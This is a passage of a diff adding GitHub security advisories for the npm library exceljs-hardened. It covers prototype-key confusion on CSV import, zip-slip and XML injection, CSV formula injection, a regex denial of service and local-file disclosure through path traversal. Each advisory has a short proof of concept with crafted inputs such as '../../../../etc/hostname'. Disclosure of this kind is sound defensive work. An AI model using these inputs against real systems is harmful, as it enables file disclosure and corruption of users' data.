+      "description": "### Summary\r\n\r\nWhen a CSV is read, cells whose text equals the name of an `Object.prototype` member (`constructor`, `toString`, `__proto__`…) are replaced by native functions or objects. Writing the workbook afterwards fails.\r\n\r\n\r\n### Details\r\n\r\nSpecial values such as `true`, `false` and `#N/A` are looked up in a plain object using the raw cell text. For `constructor`, `toString` or `hasOwnProperty`, the lookup returns a function from the prototype chain, and `__proto__` returns `Object.prototype` itself.\r\n\r\n\r\n### Proof of concept\r\n\r\n```js\r\nconst wb = new ExcelJS.Workbook();\r\nconst input = new PassThrough();\r\ninput.end('constructor,toString,__proto__\\n');\r\n\r\nconst ws = await wb.csv.read(input);\r\n\r\ntypeof ws.getCell('A1').value;   // 'function'  (expected 'constructor')\r\n\r\nawait wb.xlsx.writeBuffer();\r\n// TypeError: Cannot read properties of undefined (reading 'richText')\r\n```\r\n\r\n\r\n### Impact\r\n\r\nData corruption on import, and a crash of any pipeline that converts such a CSV to XLSX. These words are plausible in ordinary data (glossaries, source code listings).\r\n",
+      "severity": "medium",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-4h28-922h-3f38",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:03:57Z",
+      "published_at": "2026-10-16T16:03:57Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N",
+          "score": 6.9
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-20",
+          "name": "Improper Input Validation"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-20"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-43fg-g866-rg5r",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-43fg-g866-rg5r",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-43fg-g866-rg5r",
+      "summary": "Unvalidated image extension reaches ZIP entry names and relationship targets",
+      "description": "### Summary\r\n\r\n`addImage` accepts any string as `extension`. It is used to build the ZIP entry name of the image and, in the streaming writer, an unescaped relationship target.\r\n\r\n\r\n### Details\r\n\r\nThe extension is concatenated into `xl/media/image<N>.<extension>`.\r\n\r\nIn the streaming writer, the ZIP entry keeps the name verbatim, including `..` segments. In the relationship writer, the target is written without XML encoding.\r\n\r\n\r\n### Proof of concept\r\n\r\n```js\r\nconst wb = new ExcelJS.stream.xlsx.WorkbookWriter({ filename: 'out.xlsx' });\r\n\r\nwb.addImage({ buffer: png, extension: 'png/../../../../tmp/zipslip' });\r\n\r\nconst ws = wb.addWorksheet('S');\r\nws.addRow([1]).commit();\r\nawait ws.commit();\r\nawait wb.commit();\r\n```\r\n\r\n`out.xlsx` contains an entry named `xl/media/image0.png/../../../../tmp/zipslip`.\r\n\r\n\r\n### Impact\r\n\r\nA tool that extracts the generated workbook without sanitizing entry names can be made to write outside its target directory. The relationship target can also be used to alter the generated XML.\r\n\r\nIt requires the application to pass a user-controlled extension to `addImage`.\r\n",
+      "severity": "low",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-43fg-g866-rg5r",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:03:42Z",
+      "published_at": "2026-10-16T16:03:42Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+          "score": 2.3
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory"
+        },
+        {
+          "cwe_id": "CWE-91",
+          "name": "XML Injection"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-22",
+        "CWE-91"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-c3rg-r93c-qhxr",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-c3rg-r93c-qhxr",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-c3rg-r93c-qhxr",
+      "summary": "XML injection in the pivot table cache",
+      "description": "### Summary\r\n\r\nCell values and column headers used as the source of a pivot table are written into the pivot cache XML without escaping. A crafted value injects XML elements, and ordinary values such as `R&D <x>` produce an invalid file.\r\n\r\n\r\n### Details\r\n\r\nThe pivot cache definition and records are built by string concatenation. Header names and shared items are placed inside attribute values as-is, so a `\"` closes the attribute and a `<` or `&` breaks the document.\r\n\r\n\r\n### Proof of concept\r\n\r\n```js\r\nconst wb = new ExcelJS.Workbook();\r\nconst src = wb.addWorksheet('Source');\r\nsrc.addRows([\r\n  ['A', 'V'],\r\n  ['a\"/><injected foo=\"1', 4],\r\n  ['R&D <x>', 5],\r\n]);\r\n\r\nwb.addWorksheet('Pivot').addPivotTable({\r\n  sourceSheet: src, rows: ['A'], columns: [], values: ['V'], metric: 'sum',\r\n});\r\n\r\nawait wb.xlsx.writeBuffer();\r\n```\r\n\r\n`xl/pivotCache/pivotCacheDefinition1.xml` then contains an `<injected foo=\"1\"/>` element, and the `R&D <x>` value makes the part malformed.\r\n\r\n\r\n### Impact\r\n\r\nThe generated workbook is corrupted, or contains elements chosen by whoever controls the source data. Excel may refuse to open the file.\r\n",
+      "severity": "medium",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-c3rg-r93c-qhxr",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:03:28Z",
+      "published_at": "2026-10-16T16:03:28Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N",
+          "score": 5.3
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-91",
+          "name": "XML Injection"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-91"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-9chv-qfvx-pgpq",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-9chv-qfvx-pgpq",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-9chv-qfvx-pgpq",
+      "summary": "CSV formula injection after an embedded list separator",
+      "description": "### Summary\r\n\r\nThe CSV export neutralizes values that begin with `=`, `+`, `-` or `@`, but not values where one of those characters follows a list separator inside the field.\r\n\r\n\r\n### Details\r\n\r\nThe file is written with `,` as the separator, and only the first character of each field is checked.\r\n\r\nA spreadsheet opened in a locale where the list separator is `;` (French, German…) splits `x;=1+1` into two cells, and the second one starts with `=`.\r\n\r\n\r\n### Proof of concept\r\n\r\n```js\r\nconst ws = wb.addWorksheet('S');\r\nws.addRow(['x;=1+1', 'ok']);\r\n\r\n(await wb.csv.writeBuffer()).toString();\r\n// x;=1+1,ok\r\n```\r\n\r\nOpened with `;` as the list separator, the file shows `x` and a live formula `=1+1`.\r\n\r\n\r\n### Impact\r\n\r\nA formula chosen by the attacker is evaluated for whoever opens the export, which can leak data through functions such as `HYPERLINK`.\r\n\r\nIt requires the victim's separator setting and their confirmation to enable editing.\r\n",
+      "severity": "low",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-9chv-qfvx-pgpq",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:03:18Z",
+      "published_at": "2026-10-16T16:03:18Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:A/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "score": 2.1
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-1236",
+          "name": "Improper Neutralization of Formula Elements in a CSV File"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-1236"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-pr65-54q8-vhqm",
+      "cve_id": "CVE-2026-128345",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-pr65-54q8-vhqm",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-pr65-54q8-vhqm",
+      "summary": "Regular expression denial of service when reading shared formulas",
+      "description": "### Summary\r\n\r\nReading `cell.formula` on a shared formula child cell blocks the event loop for several seconds when the master formula is very long.\r\n\r\n\r\n### Details\r\n\r\nThe formula is translated to the child's position with a regular expression whose cost is quadratic in the length of runs of identifier characters.\r\n\r\nExcel limits a formula to 8,192 characters, where the cost is about 30 ms. The library applied no limit.\r\n\r\n\r\n### Proof of concept\r\n\r\nAdd two rows to `xl/worksheets/sheet1.xml` of a valid workbook, with a master formula of 100,000 characters:\r\n\r\n```xml\r\n<row r=\"3\"><c r=\"A3\"><f t=\"shared\" ref=\"A3:A4\" si=\"0\">----------…(100000 chars)</f><v>0</v></c></row>\r\n<row r=\"4\"><c r=\"A4\"><f t=\"shared\" si=\"0\"/><v>0</v></c></row>\r\n```\r\n\r\n```js\r\nconst wb = new ExcelJS.Workbook();\r\nawait wb.xlsx.load(buffer);\r\n\r\nwb.getWorksheet('S').getCell('A4').formula;   // blocks for about 4.9 s\r\n```\r\n\r\nCost for the same pattern: 40,000 characters take 0.8 s, 100,000 take 4.9 s.\r\n\r\n\r\n### Impact\r\n\r\nDenial of service: the event loop is blocked for the duration of each read, and the delay multiplies with the number of crafted cells.\r\n",
+      "severity": "medium",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-pr65-54q8-vhqm",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128345",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:55:01Z",
+      "published_at": "2026-10-16T16:03:03Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+          "score": 6.9
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-1333"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-f9m8-8qmf-qq29",
+      "cve_id": "CVE-2026-128347",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-f9m8-8qmf-qq29",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-f9m8-8qmf-qq29",
+      "summary": "Missing path traversal check in the streaming writer's `addImage`",
+      "description": "### Summary\r\n\r\n`stream.xlsx.WorkbookWriter#addImage` accepts a `filename` containing `..` segments, and embeds the file it points to into the generated workbook. `Workbook#addImage` rejects the same input.\r\n\r\n\r\n### Details\r\n\r\nThe non-streaming writer checks `filename` for parent-directory traversal. The streaming writer does not: the path goes straight to the ZIP writer, which reads the file and stores it under `xl/media/`.\r\n\r\n\r\n### Proof of concept\r\n\r\n```js\r\nconst wb = new ExcelJS.stream.xlsx.WorkbookWriter({ filename: 'out.xlsx' });\r\n\r\nwb.addImage({ filename: '../../../../etc/hostname', extension: 'png' });\r\n\r\nconst ws = wb.addWorksheet('S');\r\nws.addRow([1]).commit();\r\nawait ws.commit();\r\nawait wb.commit();\r\n```\r\n\r\n`out.xlsx` now contains `xl/media/image0.png` with the content of `/etc/hostname`.\r\n\r\nThe same call on `Workbook#addImage` throws a `parent-directory traversal` error.\r\n\r\n\r\n### Impact\r\n\r\nDisclosure of local files readable by the Node.js process, when a path derived from user input reaches `addImage`. The file content ends up in the workbook returned to the user.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-f9m8-8qmf-qq29",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128347",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:56:03Z",
+      "published_at": "2026-10-16T16:02:50Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "score": 8.2
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory"
+        },
+        {
+          "cwe_id": "CWE-73",
+          "name": "External Control of File Name or Path"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-22",
+        "CWE-73"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-4x86-rw7g-whwg",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-4x86-rw7g-whwg",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-4x86-rw7g-whwg",
+      "summary": "Missing decompression limits in the streaming reader",
